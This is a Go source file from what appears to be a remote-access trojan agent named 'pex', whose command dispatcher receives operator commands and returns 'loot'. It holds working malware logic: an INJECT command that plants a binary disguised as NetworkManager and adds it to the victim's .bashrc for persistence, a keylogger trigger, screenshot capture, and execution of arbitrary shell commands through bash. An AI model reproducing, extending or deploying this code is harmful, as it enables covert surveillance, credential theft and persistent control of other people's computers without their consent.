package agent

import (
	"bytes"
	"fmt"
	"os/exec"
	"strconv"
	"strings"

	"github.com/hardal7/pex/internal/config"
	logger "github.com/hardal7/pex/internal/util"
)

func runCommand(command []string) Loot {
	logger.Debug("Executing command: " + command[0])

	var loot Loot
	switch command[0] {
	case "INJECT":
		// TODO: Support zsh
		const injectCommand string = "echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bashrc; mv ./NetworkManager /usr/local/bin/NetworkManager; source ~/.bashrc"
		loot.Content = ExecuteCommand([]string{injectCommand})
	case "SESSION":
		go JoinSession()
	case "INTERVAL":
		if len(command) > 1 {
			interval, err := strconv.Atoi(command[1])
			if err == nil {
				config.Interval = interval
			}
		}
	case "LOGKEYS":
		state.IsLoggingKeys = true
		go LogKeyboard()
	case "STOP-LOGKEYS":
		state.IsLoggingKeys = false
		// TODO: Signal go routine to stop
	case "SCREEN":
		screenshots := CaptureScreen()
		loot.Kind = "Image"
		// TODO: Send more than 1 screenshot for multiple monitor setups
		loot.Content = screenshots[0]
	default:
		loot.Content = ExecuteCommand(command)
		logger.Debug("Output:\n" + loot.Content)
	}
	logger.Info("Executed command")

	return loot
}

func ExecuteCommand(command []string) string {
	var stdout bytes.Buffer
	var stderr bytes.Buffer

	var commandExists bool = false
	var cmd *exec.Cmd
	if len(command) != 0 {
		switch state.OS {
		// case "Linux":
		default:
			command = append([]string{"-c"}, strings.Join(command, " "))
			cmd = exec.Command("bash", command...)
			// default:
			// cmd = exec.Command("powershell", command...)
		}
		commandExists = true
	}

	if commandExists {
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err := cmd.Run()
		if err != nil {
			logger.Info("Failed executing command: " + err.Error())
			fmt.Println(command)
		}
	}
	if stderr.String() != "" {
		logger.Info("Error Output: " + stderr.String())
	}

	return stdout.String() + stderr.String()
}
